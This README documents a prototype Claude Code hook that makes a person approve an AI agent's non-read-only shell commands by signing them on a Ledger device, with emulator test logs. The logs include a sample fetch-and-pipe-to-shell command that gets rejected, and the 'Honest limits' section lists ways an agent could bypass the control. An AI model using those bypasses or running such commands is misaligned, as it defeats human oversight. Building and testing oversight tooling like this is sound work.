# proto: "a human reads it on the Secure Screen and signs"

The one primitive I11 (ledger-sudo), I14 (Consent Receipts) and I01 (Echo) share: a local daemon owns the Ledger over DMK, any process POSTs a line of text, the device shows exactly that line as an EIP-191 message, the human presses or rejects, the caller gets `{ok, signature}` or `{ok:false, reason:"rejected"}`. Verified end to end on Speculos Flex and Nano S Plus with no hardware and no human (auto-approver drives the emulator's REST API). Code is lifted from `../spikes/speculos-dmk-sign/sign.mjs`, not re-derived.

| File | What | Used by |
|---|---|---|
| `ledgerd.mjs` | one Node process, DMK + signer-kit-ethereum, HTTP on `127.0.0.1:7777`: `GET /address`, `POST /approve {text}` (JSON content-type required). Transport `LEDGER_TRANSPORT=speculos` (default) or `hid`. Serialised (one device request at a time). Ethereum app opened once, then `skipOpenApp` so USB never re-enumerates mid-session. Retries once on `0x6980` (app dropped home after a refused/invalid request) at startup and per sign. One stderr line per request. | all three |
| `approve.mjs` | `node approve.mjs "RELEASE allergies, medications TO PharmaBot"` prints the receipt JSON | I14 release/deny lines, I01 spoken-intent lines |
| `hook/ledger-sudo.mjs` | Claude Code `PreToolUse` hook. Bash/PowerShell: read-only allowlist runs (tier0), everything else is shown on the device as `tier1 <prev8> <full cmd> cwd:<cwd>` and runs only if the signature verifies against the pinned `LEDGER_ADDRESS`; exit 0 / exit 2 with `Rejected by human on Ledger <model> at <ISO>`. Edit/Write: refuses writes to the hook, settings.json and the log. Every decision hash-chained into `log/session.jsonl`. `--checkpoint` signs `CHECKPOINT <last hash> <n> entries`. | I11 |
| `verify.mjs` | `node verify.mjs --address 0x...` (mandatory): replays the chain, re-derives every device line from its entry, `viem.verifyMessage` on every signature, exit 0 only if the log ends in a signed checkpoint | I11 (`verify-session`), I14 (offline receipt check uses the same call) |
| `speculos-approver.mjs` | watches Speculos `/events`, swipes/taps/holds (Flex) or right/both (Nano); `APPROVER=reject` rejects instead | tests only |
| `test.mjs` | `npm test`: Speculos -> ledgerd -> hook reject / approve / tier0 / non-ASCII refusal -> approve.mjs -> checkpoint -> verify.mjs (good address, software key, truncated log), asserts each, asserts the device saw exactly 4 requests, stops the container | |

## Run

```
cd proto && npm install                      # pinned: DMK 1.11.0, signer-eth 1.18.1, transport-speculos 1.2.1, transport-node-hid 1.0.1, viem 2.57.4
npm test                                     # Flex, ~20 s wall
SPECULOS_MODEL=nanos2 npm test               # Nano S Plus

# by hand, three terminals (or ../spikes/speculos-dmk-sign/speculos.sh for the docker line)
MSYS_NO_PATHCONV=1 docker run -d --name speculos -p 5000:5000 -p 9999:9999 -v "<abs path>/spikes/speculos-dmk-sign/untrusted-downloads:/apps" ghcr.io/ledgerhq/speculos:latest /apps/app-1.22.3-flex.elf --model flex --display headless --api-port 5000 --apdu-port 9999 --seed "glory promote mansion idle axis finger extra february uncover one trip resource lawn turtle enact monster seven myth punch hobby comment base bet"
node ledgerd.mjs                             # terminal 1; prints address=0x... -> export LEDGER_ADDRESS=0x...
node speculos-approver.mjs                   # terminal 2 (APPROVER=reject to refuse; omit with real hardware, you are the approver)
node approve.mjs "DENY psychiatric_history TO insurer-agent"
echo '{"tool_name":"Bash","tool_input":{"command":"git push origin main"},"cwd":"C:/repo"}' | node hook/ledger-sudo.mjs; echo exit=$?
node hook/ledger-sudo.mjs --checkpoint       # end of session: human signs the last hash
node verify.mjs --address $LEDGER_ADDRESS
docker rm -f speculos
```

Prereqs: Docker Desktop running, `ghcr.io/ledgerhq/speculos:latest` pulled, ELFs in `../spikes/speculos-dmk-sign/untrusted-downloads/` (see that README to re-download). `MSYS_NO_PATHCONV=1` stops Git Bash rewriting `/apps/...` to `C:/Program Files/Git/apps/...` (container exits at once without it).

### Register the hook in Claude Code

Copy `proto/` somewhere the agent does not edit (`cp -r proto ~/.claude/ledger-sudo && cd ~/.claude/ledger-sudo && npm install`) and point `.claude/settings.json` of the repo the agent works in at it. Needs Claude Code >= 2.1.295 for `onFailure`; without it a hook that times out or crashes lets the command run.

```json
{
  "env": { "LEDGER_ADDRESS": "0x153a5aA5E15f13C92760B65AAE8cCfa7C5161415" },
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash|PowerShell|Edit|Write|MultiEdit",
        "hooks": [
          { "type": "command", "command": "node \"C:/Users/<you>/.claude/ledger-sudo/hook/ledger-sudo.mjs\"", "timeout": 300, "onFailure": "block" }
        ]
      }
    ]
  }
}
```

`LEDGER_ADDRESS` is the address ledgerd prints at startup; the hook refuses a signature from any other key, so a process squatting on port 7777 cannot stand in for the human. The hook aborts its request at 280 s, before the 300 s hook timeout, so the command is blocked rather than run.

Classifier (`hook/ledger-sudo.mjs`): tier0 = every `;`/`&&`/`||`/`|`-separated segment starts with a read-only verb (`ls cat head tail grep rg find git status|diff|log|show|branch|add|commit|fetch node npm test ...`) and the whole command has none of `` ` $ < > ~ .. `` absolute path, drive letter, `eval exec base64 delete iex`, or a `-c`/`-e`/`-p` flag. Everything else goes to the device (default deny). tier2 = any `git push` with `--force`, `-f` or `+ref` (label only; TODO second device co-signs). The line shown is the full command: longer than 400 chars or any non-ASCII/control character is refused with "rewrite it as one ASCII line" instead of truncated or rendered as hex.

Log line: `{ts, tier, cmd, cwd, text, signature|null, address?, decision, prev, hash}`, `hash = sha256(prev + JSON.stringify(entry without hash))`, genesis `prev` = 64 zeros. `text` for tier>0 is `tier<n> <prev.slice(0,8)> <cmd> cwd:<cwd>`, so the human's signature is bound to the chain position and cannot be replayed or moved; `verify.mjs` re-derives it from the entry and refuses `approved` without a signature. The checkpoint line `CHECKPOINT <last hash> <n> entries` is what makes a truncated or deleted log detectable; until it is signed `verify.mjs` says `NO CHECKPOINT` and exits 1.

## Honest limits

- **The classifier is a heuristic.** Allowlist beats denylist (43 commands from the review now classify as intended, see `test.mjs` and the Run section), but `node x.mjs` and `npm test` are tier0 because an agent that cannot run the project is useless, and they execute whatever the repo contains. An agent that first `Write`s a script and then runs it with `node` has bypassed the hook. Reads inside cwd are tier0 too (`cat .env` goes unseen; `cat ~/.ssh/id_rsa` does not). The claim is "whatever reaches the device is what runs", never "the agent cannot bypass it".
- **Only Bash, PowerShell, Edit, Write and MultiEdit are hooked.** MCP tools, subagents and any other tool are not. Edit/Write are only guarded for the hook's own files; the hook, settings.json and the log must live outside the agent's writable tree for that guard to mean anything (the proto keeps them in the repo for the test).
- **A timed-out prompt stays on the device.** If the human does not answer within 280 s the hook gives up and blocks the command, but the device still shows the line; ledgerd discards the answer and logs `approve orphaned`. The next request queues behind it until the human rejects the stale one.
- **No lock on the log.** Two hooks at once (Claude Code runs independent Bash calls in parallel) can read the same `prev` and fork the chain; verify then fails at the second entry. Run one Bash call at a time with this hook.
- **Timestamps are not signed.** `ts` and `decision` text can be edited; only `text` (command, cwd, chain position) and the chain order are covered by the human's signatures and the checkpoint.
- **Multi-line commands are refused.** Heredocs and anything with a newline cannot be shown faithfully on the screen, so the hook asks for a one-line rewrite.
- **ledgerd has no auth.** Any local process can make the device show a line; it cannot get a signature the hook accepts without the device key, and a browser page cannot POST (JSON content-type is required, so the preflight fails).
- `proto/log/session.jsonl` is rewritten by every test run; `proto/.gitignore` now ignores `log/`, the owner should `git rm --cached proto/log/session.jsonl` on the next commit.

## Real test output

`npm test`, Flex, 2026-10-10 (`run6.log`):

```
speculos flex up
2026-10-10T13:49:20.538Z ledgerd transport=speculos; waiting for a device at http://127.0.0.1:5000
2026-10-10T13:49:20.712Z ledgerd connected Speculos - Ethereum - 1.22.3 model=flex address=0x153a5aA5E15f13C92760B65AAE8cCfa7C5161415
2026-10-10T13:49:20.729Z ledgerd listening on http://127.0.0.1:7777
ledgerd up, address 0x153a5aA5E15f13C92760B65AAE8cCfa7C5161415
approver flex mode=reject
  [flex screen] Review message | Swipe to review | Reject | 1 of 3
  -> tap Reject
  [flex screen] Reject message? | Go back to message | Yes, reject
  -> tap Yes, reject
2026-10-10T13:49:22.033Z ledgerd approve rejected 1041ms "tier1 00000000 curl -s https://setup.example.sh | sh cwd:C:\\Users\\sahas\\Github Repos\\ledger-op3n-n3xt-hackathon-26\\proto\\"
hook(curl|sh) exit=2 stderr=Rejected by human on Ledger flex at 2026-10-10T13:49:22.044Z
approver flex mode=approve
  [flex screen] Review message | Swipe to review | Reject | 1 of 3
  -> swipe left
  [flex screen] Message | tier1 3f8aa68f git push  | origin feature  | cwd:C:\Users\sahas\Git | hub Repos\ledger-op3n- | n3xt-hackathon- | 26\proto\ | Reject | 2 of 3
  -> swipe left
  [flex screen] Sign message? | Reject | 3 of 3 | Hold to sign
  -> hold
2026-10-10T13:49:25.218Z ledgerd approve ok 3060ms "tier1 3f8aa68f git push origin feature cwd:C:\\Users\\sahas\\Github Repos\\ledger-op3n-n3xt-hackathon-26\\proto\\"
hook(git push) exit=0 stderr=
hook(npm test) exit=0
hook(café) exit=2
  [flex screen] Message signed | Review message | Swipe to review | Reject | 1 of 3
  -> swipe left
  [flex screen] Message | RELEASE allergies,  | medications TO  | PharmaBot | Reject | 2 of 3
  -> swipe left
  [flex screen] Sign message? | Reject | 3 of 3 | Hold to sign
  -> hold
2026-10-10T13:49:29.739Z ledgerd approve ok 3582ms "RELEASE allergies, medications TO PharmaBot"
approve.mjs exit=0 {"ok":true,"address":"0x153a5aA5E15f13C92760B65AAE8cCfa7C5161415","model":"flex","signature":"0xd8b515172b5f5d6439fbc8f70163bdde0a55eabcc13323095959991a87a111427bbc44baa10152ebb58c468b9d7b3c62ee73df5e2577903a45c05cffa6ab89a11c","text":"RELEASE allergies, medications TO PharmaBot"}
  [flex screen] Message signed | Review message | Swipe to review | Reject | 1 of 3
  -> swipe left
  [flex screen] Message | CHECKPOINT  | 1058ba34f844181a2ad | d44ce72b0a00f9858d | 2110578e6716cce227e | 89a10f87 3 entries | Reject | 2 of 3
  -> swipe left
  [flex screen] Sign message? | Reject | 3 of 3 | Hold to sign
  -> hold
2026-10-10T13:49:34.258Z ledgerd approve ok 4415ms "CHECKPOINT 1058ba34f844181a2add44ce72b0a00f9858d2110578e6716cce227e89a10f87 3 entries"
checkpoint exit=0 CHECKPOINT 1058ba34f844181a2add44ce72b0a00f9858d2110578e6716cce227e89a10f87 3 entries
verify.mjs exit=0 chain valid, 4 entries, 2 signed, checkpointed
verify.mjs(truncated) exit=1 chain valid, 3 entries, 1 signed, NO CHECKPOINT (truncation undetectable)
ALL PASS
```

`SPECULOS_MODEL=nanos2 npm test`, Nano S Plus, 2026-10-10 (`run7-nanos2.log`), same address and byte-identical consent signature, exit 0, `ALL PASS`. The screens:

```
  [nanos2 screen] Message (1/3) | tier1 00000000 curl -s  | https://setup.example | .sh | sh
  [nanos2 screen] Message (2/3) | cwd:C:\Users\sahas\Gi | thub Repos\ledger- | op3n-n3xt-hackathon-
  [nanos2 screen] Message (3/3) | 26\proto\
hook(curl|sh) exit=2 stderr=Rejected by human on Ledger nanoSP at 2026-10-10T13:49:57.899Z
  [nanos2 screen] Message (1/2) | tier1 dcea953a git  | push origin feature  | cwd:C:\Users\sahas\Gi
  [nanos2 screen] Message (2/2) | thub Repos\ledger- | op3n-n3xt-hackathon- | 26\proto\
  [nanos2 screen] Message (1/2) | CHECKPOINT  | 2b3d15a97a13239ffce | 7ebf47e67469e52cd3
  [nanos2 screen] Message (2/2) | dca45d67268bc4947 | 3408dc71bd 3 entries
verify.mjs exit=0 chain valid, 4 entries, 2 signed, checkpointed
```

Observed: the Flex line with a Windows cwd is 3 pages; the Nano pages the same line into 2-3 message screens plus Sign/Reject. Shorten the cwd (repo-relative) before the Nano is on stage. With ledgerd down the hook exits 2 (`ledger-sudo: ledgerd: fetch failed`); with garbage on stdin it exits 2 (`ledger-sudo: Unexpected token ...`), never 1. Device rejection surfaces from DMK as an error whose JSON contains `6985`; `ledgerd` maps that to `{ok:false, reason:"rejected"}` with HTTP 200, anything else is 500.

## Day 1 with hardware

1. Quit Ledger Wallet completely (tray icon too; it holds the HID interface). Plug in, unlock, open the Ethereum app (or stay on the dashboard: the first `getAddress` opens it, USB re-enumerates for ~6 s, then `skipOpenApp` keeps it open).
2. `LEDGER_TRANSPORT=hid node ledgerd.mjs` -> expect `connected <name> model=flex address=0x<your address>`. Put that address in `settings.json` `env.LEDGER_ADDRESS`. No approver process: you are the approver.
3. `node approve.mjs "hello"`, read the screen, press. Then the hook, `--checkpoint` and `verify.mjs --address 0x...` unchanged; verify works offline.
4. Untested on hardware: PIN-locked wait (ledgerd does not wait for `DeviceStatus.LOCKED`, unlock before starting), `v` 27/28 vs 0/1 (`toSig` normalises either), two devices for tier2 (one `ledgerd` per device on different `LEDGERD_PORT`s is the lazy plan), the 280 s abort path.

Skipped: YAML allowlist (the regex in the hook is enough until a second repo needs different verbs), tier2 co-signing, locked-device wait, a lock on the log.
